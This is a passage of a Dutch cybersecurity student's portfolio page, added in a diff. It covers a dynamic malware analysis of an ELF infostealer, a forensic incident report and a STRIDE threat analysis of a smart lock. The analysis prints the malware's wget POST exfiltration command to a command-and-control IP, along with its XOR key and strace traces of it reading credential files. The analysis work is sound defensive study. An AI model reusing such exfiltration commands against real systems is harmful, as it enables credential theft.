KBApyeeaCQeaKKYDGJPSqmqN+5WiigDNc5TPFVTwfeiiqQrBc/PZt6g1mUUUgRctnwpxStO2cA0UUDP/2Q==" alt="Youssef Aitiddouch"/>
+        <canvas id="photo-rain"></canvas>
+        <div class="photo-scanlines"></div>
+        <div class="photo-label">// IDENTITY_CONFIRMED</div>
+      </div>
+    </div>
+    <div class="status-bar">
+      <div class="status-item"><div class="dot"></div>SYSTEEM ONLINE</div>
+      <div class="status-item"><div class="dot"></div>SEMESTER 2 ACTIEF</div>
+      <div class="status-item"><div class="dot" style="background:var(--amber);box-shadow:none;"></div>STAGE GEZOCHT: SEP 2025</div>
+      <div class="status-item"><div class="dot" style="background:var(--red);box-shadow:none;animation:none;"></div>LOCATIE: AMSTERDAM</div>
+    </div>
+  </header>
+
+  <div class="warning">
+    <div class="warning-label">// ETHICS_WARNING.txt</div>
+    <p>Dit portfolio bevat werk uit de Cyber Security en Dark Tech cursussen. De projecten onderzoeken hoe technologie misbruikt kan worden en hoe je daar als professional tegen beschermt.</p>
+  </div>
+
+  <section class="section">
+    <div class="sec-label">// PROJECT_LOG [04 ENTRIES]</div>
+    <div class="projects">
+
+      <div class="pcard featured" style="border:1px solid rgba(0,255,65,0.25);cursor:pointer;" onclick="rippleEffect(event,this);openLinder()">
+        <div class="top-bar"></div>
+        <div class="br-tl"></div><div class="br-tr"></div><div class="br-bl"></div><div class="br-br"></div>
+        <div class="pcard-id">PROJECT_01 &gt; DARK_TECH &gt; SEMESTER_2 &gt; [FEATURED]</div>
+        <div class="pcard-title">LINDER: FUNCTION CREEP</div>
+        <p class="pcard-desc">Een studentenmatch-app die stap voor stap meer data opeist dan waarvoor de gebruiker toestemming heeft gegeven. Jij zegt ja tegen matches vinden. De app interpreteert dat als ja tegen 24/7 gevolgd worden. Dat is function creep.</p>
+        <p class="pcard-desc">Mijn bijdrage: het premium feature systeem en de live kaartcomponent. TypeScript, React Native en Supabase.</p>
+        <p class="click-hint">[ KLIK VOOR PROJECTDETAILS ]</p>
+        <div class="tags">
+          <span class="tag">REACT NATIVE</span>
+          <span class="tag">TYPESCRIPT</span>
+          <span class="tag">SUPABASE</span>
+          <span class="tag">EXPO</span>
+          <span class="tag r">DARK PATTERNS</span>
+          <span class="tag r">FUNCTION CREEP</span>
+          <span class="tag">REALTIME MAP</span>
+          <span class="tag">SCRUM</span>
+        </div>
+      </div>
+
+      <div class="pcard" onclick="rippleEffect(event,this);openModal('malwareModal')">
+        <div class="top-bar"></div>
+        <div class="pcard-id">PROJECT_02 &gt; CYBER_SECURITY &gt; SEMESTER_2</div>
+        <div class="pcard-title">MALWARE ANALYSE</div>
+        <p class="pcard-desc">Analyse van malware aan de hand van echte incidenten. Gedrag van de malware in kaart gebracht: hoe het systeem binnenkomt, wat het doet, welke sporen het achterlaat.</p>
+        <div class="tags">
+          <span class="tag r">MALWARE</span>
+          <span class="tag">INCIDENT ANALYSE</span>
+          <span class="tag">WIRESHARK</span>
+          <span class="tag">THREAT BEHAVIOUR</span>
+        </div>
+      </div>
+
+      <div class="pcard" onclick="rippleEffect(event,this);openModal('forensischModal')">
+        <div class="top-bar"></div>
+        <div class="pcard-id">PROJECT_03 &gt; CYBER_SECURITY &gt; SEMESTER_2</div>
+        <div class="pcard-title">FORENSISCH RAPPORT</div>
+        <p class="pcard-desc">Forensisch rapport opgebouwd op basis van de malware analyse. Documentatie van bevindingen, bewijsmateriaal en conclusies zoals een forensisch analist dat aanlevert aan een opdrachtgever.</p>
+        <div class="tags">
+          <span class="tag">FORENSISCH RAPPORT</span>
+          <span class="tag a">BEWIJSLAST</span>
+          <span class="tag">DOCUMENTATIE</span>
+          <span class="tag">INCIDENT RESPONSE</span>
+        </div>
+      </div>
+
+      <div class="pcard" onclick="rippleEffect(event,this);openModal('risicoModal')">
+        <div class="top-bar"></div>
+        <div class="pcard-id">PROJECT_04 &gt; CYBER_SECURITY &gt; SEMESTER_2</div>
+        <div class="pcard-title">RISICO ANALYSE: GLOWLOCK</div>
+        <p class="pcard-desc">Risico analyse van het Glowlock deurslot systeem. Kwetsbaarheden in kaart gebracht, risico's gewogen en aanbevelingen gedaan om het systeem te versterken tegen aanvallen.</p>
+        <div class="tags">
+          <span class="tag a">RISICO ANALYSE</span>
+          <span class="tag">IOT SECURITY</span>
+          <span class="tag r">KWETSBAARHEDEN</span>
+          <span class="tag">AANBEVELINGEN</span>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="sec-label">// SKILL_MATRIX</div>
+    <div class="skills-grid">
+
+      <div class="cat-label">// SECURITY_TOOLS</div>
+      <div class="skill"><div class="skill-name">Wireshark</div><div class="skill-sub">packet analyse</div><div class="skill-bar"><div class="skill-fill" data-w="65"></div></div></div>
+      <div class="skill"><div class="skill-name">Linux</div><div class="skill-sub">CLI, bash, netwerk</div><div class="skill-bar"><div class="skill-fill" data-w="70"></div></div></div>
+      <div class="skill"><div class="skill-name">Nmap</div><div class="skill-sub">netwerk scanning</div><div class="skill-bar"><div class="skill-fill" data-w="55"></div></div></div>
+      <div class="skill"><div class="skill-name">Burp Suite</div><div class="skill-sub">web pentesting</div><div class="skill-bar"><div class="skill-fill" data-w="45"></div></div></div>
+
+      <div class="cat-label">// DEV_STACK</div>
+      <div class="skill"><div class="skill-name">Python</div><div class="skill-sub">scripting & tools</div><div class="skill-bar"><div class="skill-fill" data-w="60"></div></div></div>
+      <div class="skill"><div class="skill-name">TypeScript</div><div class="skill-sub">geleerd dit semester</div><div class="skill-bar"><div class="skill-fill" data-w="65"></div></div></div>
+      <div class="skill"><div class="skill-name">React Native</div><div class="skill-sub">project ervaring</div><div class="skill-bar"><div class="skill-fill" data-w="60"></div></div></div>
+      <div class="skill"><div class="skill-name">SQL</div><div class="skill-sub">databases & queries</div><div class="skill-bar"><div class="skill-fill" data-w="55"></div></div></div>
+      <div class="skill"><div class="skill-name">Supabase</div><div class="skill-sub">backend & realtime</div><div class="skill-bar"><div class="skill-fill" data-w="55"></div></div></div>
+      <div class="skill"><div class="skill-name">Git / GitLab</div><div class="skill-sub">versiebeheer</div><div class="skill-bar"><div class="skill-fill" data-w="70"></div></div></div>
+
+      <div class="cat-label">// ANALYSE & PROCESS</div>
+      <div class="skill"><div class="skill-name">Malware analyse</div><div class="skill-sub">incident onderzoek</div><div class="skill-bar"><div class="skill-fill" data-w="60"></div></div></div>
+      <div class="skill"><div class="skill-name">Forensisch rapport</div><div class="skill-sub">documentatie</div><div class="skill-bar"><div class="skill-fill" data-w="65"></div></div></div>
+      <div class="skill"><div class="skill-name">Risico analyse</div><div class="skill-sub">kwetsbaarheden</div><div class="skill-bar"><div class="skill-fill" data-w="60"></div></div></div>
+      <div class="skill"><div class="skill-name">Scrum</div><div class="skill-sub">team van 5</div><div class="skill-bar"><div class="skill-fill" data-w="70"></div></div></div>
+      <div class="skill"><div class="skill-name">Dark Tech analyse</div><div class="skill-sub">ethisch denken</div><div class="skill-bar"><div class="skill-fill" data-w="75"></div></div></div>
+      <div class="skill"><div class="skill-name">ERD / UML</div><div class="skill-sub">systeemontwerp</div><div class="skill-bar"><div class="skill-fill" data-w="50"></div></div></div>
+
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="sec-label">// TERMINAL</div>
+    <div class="terminal" id="terminalBox"></div>
+  </section>
+
+  <section class="section">
+    <div class="sec-label">// CONTACT_INFO</div>
+    <div class="cline">Naam: <span>Youssef Aitiddouch</span></div>
+    <div class="cline">Studie: <span>HBO ICT &mdash; Cyber Security &mdash; HvA</span></div>
+    <div class="cline">Stad: <span>Amsterdam</span></div>
+    <div class="cline">Stage beschikbaar: <span>September 2025</span></div>
+    <div class="cline">Interesse: <span>Forensisch ICT Analist</span></div>
+  </section>
+
+  <div class="footer">// END_OF_FILE &gt; youssef_aitiddouch_portfolio_v3.html &gt; ALL_RIGHTS_RESERVED</div>
+
+</div>
+
+<script>
+/* CUSTOM CURSOR - removed, glasses cursor takes over */
+
+/* MATRIX RAIN */
+const canvas=document.getElementById('rain');
+const ctx=canvas.getContext('2d');
+function resize(){canvas.width=window.innerWidth;canvas.height=window.innerHeight;}
+resize();
+window.addEventListener('resize',()=>{resize();initDrops();});
+const chars='アイウエオカキクケコサシスセソ0123456789ABCDEF></?!';
+let drops=[];
+function initDrops(){drops=Array(Math.floor(canvas.width/18)).fill(1);}
+initDrops();
+function rain(){
+  ctx.fillStyle='rgba(0,0,0,0.045)';
+  ctx.fillRect(0,0,canvas.width,canvas.height);
+  ctx.font='13px monospace';
+  drops.forEach((y,i)=>{
+    const bright=Math.random()>0.95;
+    ctx.fillStyle=bright?'#ffffff':'#00ff41';
+    ctx.fillText(chars[Math.floor(Math.random()*chars.length)],i*18,y*18);
+    if(y*18>canvas.height&&Math.random()>0.975)drops[i]=0;
+    drops[i]++;
+  });
+}
+setInterval(rain,45);
+
+/* SKILL BARS */
+setTimeout(()=>{
+  document.querySelectorAll('.skill-fill').forEach(el=>{
+    el.style.width=el.dataset.w+'%';
+  });
+},400);
+
+/* RIPPLE EFFECT */
+function rippleEffect(e,el){
+  const r=document.createElement('div');
+  r.className='ripple';
+  const rect=el.getBoundingClientRect();
+  r.style.left=(e.clientX-rect.left)+'px';
+  r.style.top=(e.clientY-rect.top)+'px';
+  el.appendChild(r);
+  setTimeout(()=>r.remove(),700);
+}
+
+/* TERMINAL TYPEWRITER */
+const lines=[
+  {p:'root@hva:~$',cmd:' whoami',delay:0},
+  {p:'',cmd:'youssef_aitiddouch // cyber security student',delay:800,plain:true},
+  {p:'root@hva:~$',cmd:' cat doel.txt',delay:1600},
+  {p:'',cmd:'forensisch ICT analist worden. bij voorkeur politie.',delay:2400,plain:true},
+  {p:'root@hva:~$',cmd:' ls projects/',delay:3200},
+  {p:'',cmd:'linder/  malware_analyse/  forensisch_rapport/  glowlock_risico/',delay:4000,plain:true},
+  {p:'root@hva:~$',cmd:' _',delay:4800,blink:true},
+];
+const tb=document.getElementById('terminalBox');
+lines.forEach(l=>{
+  setTimeout(()=>{
+    const line=document.createElement('div');
+    if(l.plain){
+      line.style.color='rgba(0,255,65,0.5)';
+      line.textContent=l.cmd;
+    } else if(l.blink){
+      line.innerHTML='<span style="color:var(--green)">'+l.p+'</span><span class="blink" style="color:var(--green)">_</span>';
+    } else {
+      line.innerHTML='<span style="color:var(--green)">'+l.p+'</span><span style="color:#fff">'+l.cmd+'</span>';
+    }
+    tb.appendChild(line);
+  },l.delay);
+});
+</script>
+
+
+<!-- MALWARE ANALYSE MODAL -->
+<div class="modal-backdrop" id="malwareModal" onclick="closeOnBackdrop2(event,'malwareModal')">
+  <div class="modal">
+    <div class="modal-topbar">
+      <span>// PROJECT_02 &gt; LAB_8 &gt; DYNAMIC_MALWARE_ANALYSIS &gt; Q201</span>
+      <button class="modal-close" onclick="closeModal('malwareModal')">[ SLUITEN X ]</button>
+    </div>
+    <div class="modal-body">
+      <div class="modal-hero">
+        <div class="modal-project-id">CYBER_SECURITY &gt; DYNAMISCHE MALWARE ANALYSE &gt; UBUNTU VM &gt; NOV 2025</div>
+        <div class="modal-title">MALWARE ANALYSE</div>
+        <p class="modal-tagline">Volledige dynamische analyse van een ELF 64-bit infostealer in een geïsoleerde Ubuntu VM. Ik heb het gedrag zelf gereconstrueerd via processen, bestandsactiviteiten, system calls en netwerkverkeer — zonder sandbox, met volledige controle.</p>
+        <div class="modal-tags">
+          <span class="tag r">ELF 64-BIT</span><span class="tag">UBUNTU VM</span><span class="tag">HTOP</span>
+          <span class="tag">INOTIFYWAIT</span><span class="tag">STRACE</span><span class="tag">LTRACE</span>
+          <span class="tag">WIRESHARK</span><span class="tag a">CHAIN OF CUSTODY</span>
+        </div>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">VAARDIGHEID: VEILIGE OMGEVING OPZETTEN</div>
+        <p class="modal-text">Ik heb bewust gekozen voor een VM boven een sandbox — meer controle, realistischere resultaten. Gedeelde map ingesteld als alleen-lezen zodat malware niet terug kon schrijven naar Windows. Hash geverifieerd voor Chain of Custody:</p>
+        <div class="term-block">
+          <div class="term-titlebar"><span>TERMINAL — sha256sum verificatie</span><span>ubuntu@vm ~/Malware-Concer</span></div>
+          <div class="term-body">
+            <span class="prompt">$ </span><span class="cmd">sha256sum update-tool</span><br>
+            <span class="hi">1530c368b56bad537a33c604e6b9610b0e1952ebd1fddc727a9c2ee5fcb27216</span>&nbsp;&nbsp;update-tool<br>
+            <span class="dim"># hash uit Teams:</span><br>
+            <span class="dim">1530c368b56bad537a33c604e6b9610b0e1952ebd1fddc727a9c2ee5fcb27216 ✓ match</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">VAARDIGHEID: PROCESANALYSE</div>
+        <p class="modal-text">Malware was te snel voor top, dus ik gebruikte htop met F3-zoekfunctie. Daarna draaitijd gemeten en procesboom in kaart gebracht:</p>
+        <div class="term-block">
+          <div class="term-titlebar"><span>TERMINAL — time + pstree analyse</span><span>ubuntu@vm ~/Malware-Concer</span></div>
+          <div class="term-body">
+            <span class="prompt">$ </span><span class="cmd">time ./update-tool</span><br>
+            <span class="out">Wait ... Wait ... Wait ... Wait ... Wait ... Wait ...</span><br>
+            <span class="out">Done!</span><br>
+            <br>
+            <span class="hi">real&nbsp;&nbsp;&nbsp;140.80s</span><br>
+            <span class="dim">user&nbsp;&nbsp;&nbsp;0.01s</span><br>
+            <span class="dim">sys&nbsp;&nbsp;&nbsp;&nbsp;0.01s</span><br>
+            <br>
+            <span class="prompt">$ </span><span class="cmd">pstree -p</span><br>
+            <span class="out">qterminal(1673)─┬─zsh(1680)──</span><span class="hi">update-tool(1696)</span><br>
+            <span class="dim"># parent: zsh(1680) | child: update-tool(1696)</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">VAARDIGHEID: BESTANDSACTIVITEITEN MONITOREN</div>
+        <p class="modal-text">inotifywait gestart op /tmp terwijl malware draaide. Ik zag een tijdelijk staging bestand verschijnen dat snel werd verwijderd:</p>
+        <div class="term-block">
+          <div class="term-titlebar"><span>TERMINAL — inotifywait /tmp monitor</span><span>ubuntu@vm ~/Malware-Concer</span></div>
+          <div class="term-body">
+            <span class="prompt">$ </span><span class="cmd">inotifywait -t 200 -e access -e modify -e create --format '%w%f' -r /tmp</span><br>
+            <span class="dim">Setting up watches. Beware: since -r was given, this may take a while!</span><br>
+            <span class="dim">Watches established.</span><br>
+            <span class="hi">/tmp/C2_push.txt</span><br>
+            <br>
+            <span class="dim"># inhoud (snel verwijderd door malware):</span><br>
+            <span class="out">/home/youspous</span><br>
+            <span class="err">No such file or directory</span><br>
+            <span class="dim"># conclusie: tijdelijk exfiltratie-staging bestand</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">VAARDIGHEID: SYSTEM CALLS TRACEN (STRACE)</div>
+        <p class="modal-text">strace uitgevoerd met stderr+stdout gecombineerd via tee. Live meegekeken via tail -f. Openat-regels gefilterd — ik zag precies welke bestanden de malware probeerde te openen:</p>
+        <div class="term-block">
+          <div class="term-titlebar"><span>TERMINAL — strace + grep openat</span><span>ubuntu@vm ~/Malware-Concer</span></div>
+          <div class="term-body">
+            <span class="prompt">$ </span><span class="cmd">strace ./update-tool 2>&amp;1 | tee strace.update-tool.log</span><br>
+            <span class="dim"># in tweede terminal:</span><br>
+            <span class="prompt">$ </span><span class="cmd">grep 'openat' strace.update-tool.log</span><br>
+            <br>
+            <span class="out">openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = </span><span class="hi">3</span><br>
+            <span class="out">openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libsqlite3.so.0", ...) = </span><span class="hi">3</span><br>
+            <span class="out">openat(AT_FDCWD, "/proc/self/loginuid", O_RDONLY) = </span><span class="hi">3</span><br>
+            <span class="out">openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = </span><span class="hi">3</span><br>
+            <span class="err">openat(AT_FDCWD, "/home/youspous/.ssh/authorized_keys", ...) = -1 ENOENT</span><br>
+            <span class="hi">openat(AT_FDCWD, "/tmp/C2_push.txt", O_WRONLY|O_CREAT|O_APPEND, 0666) = 5</span><br>
+            <br>
+            <span class="dim"># 3,4,5 = file descriptors: nummers die Linux toewijst aan geopende bestanden</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">VAARDIGHEID: LIBRARY CALLS + NETWERKVERKEER (LTRACE)</div>
+        <p class="modal-text">ltrace toonde de library calls. Eerste regel onthulde al wat de malware doet. Via grep vond ik het volledige exfiltratie-commando:</p>
+        <div class="term-block">
+          <div class="term-titlebar"><span>TERMINAL — ltrace output + grep wget</span><span>ubuntu@vm ~/Malware-Concer</span></div>
+          <div class="term-body">
+            <span class="prompt">$ </span><span class="cmd">ltrace ./update-tool 2>&amp;1 | tee ltrace.update-tool.log</span><br>
+            <br>
+            <span class="dim"># eerste regels:</span><br>
+            <span class="hi">getlogin()</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= <span class="val">"youspous"</span><br>
+            <span class="out">strlen("youspous")</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= <span class="val">8</span><br>
+            <span class="dim"># malware steelt gebruikersnaam en verwerkt de lengte</span><br>
+            <br>
+            <span class="prompt">$ </span><span class="cmd">grep "wget" ltrace.update-tool.log</span><br>
+            <span class="hi">snprintf("wget --post-data=&quot;name=651d1c192&quot;...,</span><br>
+            <span class="hi">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"http://20.157.119.19/processm.ph"...) = 425</span><br>
+            <span class="hi">system("wget --post-data=&quot;name=651d1c192&quot;...</span><br>
+            <br>
+            <span class="dim"># protocol: HTTP (direct IP, geen DNS)</span><br>
+            <span class="dim"># vervolgstap: Wireshark voor packet-niveau analyse</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">BEWEZEN VAARDIGHEDEN</div>
+        <div class="proof-grid">
+          <div class="proof-card">
+            <div class="proof-card-label">// SKILL_01</div>
+            <div class="proof-card-skill">VM Isolatie & CoC</div>
+            <div class="proof-card-body">Veilige omgeving opgezet, alleen-lezen gedeelde map, SHA256 geverifieerd, Chain of Custody vastgelegd.</div>
+            <div class="proof-card-evidence">BEWIJS: sha256sum output ↑</div>
+          </div>
+          <div class="proof-card">
+            <div class="proof-card-label">// SKILL_02</div>
+            <div class="proof-card-skill">Procesanalyse</div>
+            <div class="proof-card-body">PID gevonden via htop F3, draaitijd gemeten met time, procesboom in kaart met pstree -p.</div>
+            <div class="proof-card-evidence">BEWIJS: pstree output ↑</div>
+          </div>
+          <div class="proof-card">
+            <div class="proof-card-label">// SKILL_03</div>
+            <div class="proof-card-skill">Filesystem Monitoring</div>
+            <div class="proof-card-body">inotifywait ingezet om bestandsaanmaak in /tmp te detecteren. C2_push.txt ontdekt en geanalyseerd.</div>
+            <div class="proof-card-evidence">BEWIJS: inotifywait output ↑</div>
+          </div>
+          <div class="proof-card">
+            <div class="proof-card-label">// SKILL_04</div>
+            <div class="proof-card-skill">System Call Analyse</div>
+            <div class="proof-card-body">strace + grep openat gefilterd. File descriptors begrepen. SSH-key leespoging en C2 bestand aanmaak geïdentificeerd.</div>
+            <div class="proof-card-evidence">BEWIJS: strace grep output ↑</div>
+          </div>
+          <div class="proof-card">
+            <div class="proof-card-label">// SKILL_05</div>
+            <div class="proof-card-skill">Library Call Analyse</div>
+            <div class="proof-card-body">ltrace toonde getlogin() en wget POST naar C2-server. Netwerk-exfiltratie bewezen zonder Wireshark.</div>
+            <div class="proof-card-evidence">BEWIJS: ltrace wget output ↑</div>
+          </div>
+          <div class="proof-card">
+            <div class="proof-card-label">// SKILL_06</div>
+            <div class="proof-card-skill">Analytisch Redeneren</div>
+            <div class="proof-card-body">Bewijs gecombineerd uit vier bronnen tot één conclusie. Beperkingen eerlijk benoemd (snel verwijderd bestand).</div>
+            <div class="proof-card-evidence">BEWIJS: dit hele rapport ↑</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- FORENSISCH RAPPORT MODAL -->
+<div class="modal-backdrop" id="forensischModal" onclick="closeOnBackdrop2(event,'forensischModal')">
+  <div class="modal">
+    <div class="modal-topbar">
+      <span>// PROJECT_03 &gt; FORENSISCH_RAPPORT &gt; BYB &gt; NOV_2025</span>
+      <button class="modal-close" onclick="closeModal('forensischModal')">[ SLUITEN X ]</button>
+    </div>
+    <div class="modal-body">
+      <div class="modal-hero">
+        <div class="modal-project-id">CYBER_SECURITY &gt; FORENSISCH RAPPORT &gt; OPDRACHTGEVER: BYB</div>
+        <div class="modal-title">FORENSISCH RAPPORT</div>
+        <p class="modal-tagline">Volledig forensisch rapport van het BYB-beveiligingsincident. Vier sporenbronnen gecorreleerd tot een complete aanvalstijdlijn. Conclusies gedocumenteerd voor opdrachtgever met zekerheden, hypothesen en beperkingen.</p>
+        <div class="modal-tags">
+          <span class="tag">FORENSISCH RAPPORT</span><span class="tag a">CHAIN OF CUSTODY</span>
+          <span class="tag">CORRELATIE</span><span class="tag r">DATA EXFILTRATIE</span>
+          <span class="tag">TIJDLIJN</span><span class="tag">INCIDENT RESPONSE</span>
+        </div>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">SCOPE VAN HET ONDERZOEK</div>
+        <p class="modal-text">Op verzoek van de directie van BYB is forensisch onderzoek gestart naar aanleiding van een beveiligingsincident op 23-11-2025. Onderzoeksobjecten: memory dump (janemem.mem, 2GB), disk image (janedisk.img, 26.8GB, ext4, GPT), netwerkopname (janenet.pcap, 39MB) en malware sample (update-tool, ELF 64-bit). Alle hashes SHA256/MD5 geverifieerd en vastgelegd. Disk image uitsluitend read-only gemount.</p>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">GECORRELEERDE BEVINDINGEN</div>
+        <div class="ethics-grid">
+          <div class="ethics-item bad">
+            <div class="ethics-head">INFECTIEVECTOR</div>
+            <div class="ethics-body">Jane ontving een gerichte spearphishing mail "UpgradeTool". Om 00:10:33 CET geopend via Gmail. Link leidde naar phishing landing page op Microsoft Azure IP 20.157.119.19.</div>
+          </div>
+          <div class="ethics-item bad">
+            <div class="ethics-head">MALWARE DOWNLOAD</div>
+            <div class="ethics-body">00:11:45 CET: download van update-tool via welcome.html. Opgeslagen in /home/jane/Downloads/update-tool. Bevestigd via disk image Firefox history en PCAP GET-request.</div>
+          </div>
+          <div class="ethics-item bad">
+            <div class="ethics-head">DATA EXFILTRATIE</div>
+            <div class="ethics-body">00:12:28 CET: HTTP POST van 7947 bytes XOR-versleutelde data naar /processm.php. Gedecrypt met key "JustForFun". Resultaat: Gmail en Instagram credentials van Jane gestolen.</div>
+          </div>
+          <div class="ethics-item good">
+            <div class="ethics-head">SCOPE BEPERKT</div>
+            <div class="ethics-body">Alleen Jane's werkstation 192.168.68.116 betrokken. Geen lateral movement naar andere systemen. Incident geïsoleerd tot één werkstation. 100% van externe communicatie afkomstig van dit IP.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">CONCLUSIES EN ZEKERHEDEN</div>
+        <p class="modal-text">Met hoge zekerheid vastgesteld op basis van correlatie tussen vier sporenbronnen: update-tool is een credential stealer (infostealer) die SQLite gebruikt voor lokale data uit browserpassword managers, wget inzet voor exfiltratie (Living off the Land), en XOR-encryptie met hardcoded sleutel. IP 20.157.119.19 aangetroffen in disk image, malware binary én PCAP. Tijdlijnen uit alle drie bronnen komen exact overeen na conversie CET/EST.</p>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">BEPERKINGEN</div>
+        <p class="modal-text">De update-tool variant in het geheugen komt niet exact overeen met het bestand op de disk image, mogelijk twee varianten gebruikt. Het bestand C2_push.txt kon niet worden gereconstrueerd (snel verwijderd na aanmaak). De exacte inhoud van de phishing mail is niet volledig gereconstrueerd, alleen de titel en URL zijn bekend. Of Chrome credentials daadwerkelijk zijn buitgemaakt blijft onzeker, SQLite strings wijzen erop maar bewijs ontbreekt.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- RISICO ANALYSE MODAL -->
+<div class="modal-backdrop" id="risicoModal" onclick="closeOnBackdrop2(event,'risicoModal')">
+  <div class="modal">
+    <div class="modal-topbar">
+      <span>// PROJECT_04 &gt; RISICOPROFIELADVIES &gt; GLOWLOCK &gt; BYB</span>
+      <button class="modal-close" onclick="closeModal('risicoModal')">[ SLUITEN X ]</button>
+    </div>
+    <div class="modal-body">
+      <div class="modal-hero">
+        <div class="modal-project-id">CYBER_SECURITY &gt; RISICOPROFIELADVIES &gt; SAMENWERKING MET VINCENT NGUYEN</div>
+        <div class="modal-title">RISICO ANALYSE: GLOWLOCK</div>
+        <p class="modal-tagline">Risicoprofieladvies voor GlowLock, een slim deurslot voor kantoorgebouwen van BYB. Ik was verantwoordelijk voor de inleiding, de volledige DFD met trust boundaries, en de STRIDE-dreigingsanalyse. Vincent deed de risicoanalyse, countermeasures en het eindadvies.</p>
+        <div class="modal-tags">
+          <span class="tag">DFD</span><span class="tag r">STRIDE</span><span class="tag a">RISICOMATRIX 5x5</span>
+          <span class="tag">TRUST BOUNDARIES</span><span class="tag">IOT</span><span class="tag">RF SECURITY</span><span class="tag">RBAC</span>
+        </div>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">MIJN ROL</div>
+        <p class="modal-text">Youssef: inleiding & context, volledige DFD inclusief trust boundaries, STRIDE-dreigingsanalyse. Vincent: risicoanalyse, countermeasures, afweging en eindadvies. Door deze taakverdeling sloten de STRIDE-dreigingen direct aan op de risicotabel.</p>
+        <p class="modal-text">Tijdens het werken liep ik tegen feedback aan dat de eerste DFD-versie niet duidelijk genoeg was. Actoren als beheerder en cloudbeheerder ontbraken, en authenticatie/autorisatie waren onvoldoende uitgewerkt. Ik heb dit aangepast, processen hernoemd en trust boundaries duidelijker gemaakt.</p>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">DFD — WAT IK HEB OPGESTELD</div>
+        <p class="modal-text">7 processen (P1-P7), 3 datastores (D1-D3), 4 externe entiteiten. Drie trust boundaries gedefinieerd:</p>
+        <div class="ioc-box">
+          <div class="ioc-label">// TRUST BOUNDARIES</div>
+          TB1: Gebruiker/Beheerder &lt;-&gt; GlowLock systeem &nbsp;&gt; inloggegevens, sessietokens, ontgrendelverzoeken<br>
+          TB2: GlowLock systeem &lt;-&gt; GlowLock Cloud &nbsp;&gt; lograpporten<br>
+          TB3: GlowLock Cloud &lt;-&gt; Cloudbeheerder &nbsp;&gt; cloudloggegevens inzien en beheren
+        </div>
+        <p class="modal-text" style="margin-top:0.75rem;">De DFD beschrijft de volledige gebruikersflow: inloggen → sessietoken ontvangen → ontgrendelverzoek → RF-commando naar slot → toegangsstatus → logging lokaal en cloud. Elke stap is een apart proces met zijn eigen kwetsbaarheden.</p>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">STRIDE-ANALYSE — WAT IK HEB UITGEVOERD</div>
+        <p class="modal-text">Per proces, datastore en kritieke dataflow systematisch alle zes STRIDE-categorieën doorlopen. Focus op onderdelen met gevoelige data: authenticatie, autorisatie, toegangsbeheer en logging.</p>
+        <div class="tier-grid">
+          <div class="tier-card">
+            <div class="tier-label red">HOOGSTE DREIGING</div>
+            <div class="tier-name">P1 AUTHENTICATIE</div>
+            <div class="tier-feature">Spoofing via phishing/credential stuffing</div>
+            <div class="tier-feature">Sessietoken onderscheppen (MitM)</div>
+            <div class="tier-feature">Replay: oud token opnieuw sturen</div>
+            <div class="tier-data-req danger">S T R I aanwezig</div>
+          </div>
+          <div class="tier-card">
+            <div class="tier-label red">FYSIEKE AANVAL</div>
+            <div class="tier-name">P3 RF-COMMANDO</div>
+            <div class="tier-feature">RF replay via SDR opvangen</div>
+            <div class="tier-feature">Signaal opnieuw uitzenden</div>
+            <div class="tier-feature">Geen nonce of tijdscontrole</div>
+            <div class="tier-data-req danger">T D aanwezig</div>
+          </div>
+          <div class="tier-card">
+            <div class="tier-label amber">INSIDER RISICO</div>
+            <div class="tier-name">P6 BEHEERPORTAAL</div>
+            <div class="tier-feature">Beheerder voegt zichzelf rechten toe</div>
+            <div class="tier-feature">SQL injection via beheerportaal</div>
+            <div class="tier-feature">RBAC fouten leiden tot privilege escalation</div>
+            <div class="tier-data-req warn">S T R E aanwezig</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">TOP RISICO'S (RISICOMATRIX 5x5)</div>
+        <table class="risk-table">
+          <tr><th>DREIGING</th><th>IMPACT</th><th>KANS</th><th>SCORE</th></tr>
+          <tr><td>Authenticatiebypass / gestolen credentials (P1)</td><td>4</td><td>4</td><td class="score-high">16</td></tr>
+          <tr><td>RF replay/relay op ontgrendelcommando (P3)</td><td>5</td><td>3</td><td class="score-high">15</td></tr>
+          <tr><td>Privilege escalation via beheerportaal (P6)</td><td>5</td><td>2</td><td class="score-med">10</td></tr>
+          <tr><td>Manipulatie toegangsprofielen D1</td><td>5</td><td>2</td><td class="score-med">10</td></tr>
+          <tr><td>Cloud log lek of manipulatie (D3, P7)</td><td>3</td><td>3</td><td class="score-med">9</td></tr>
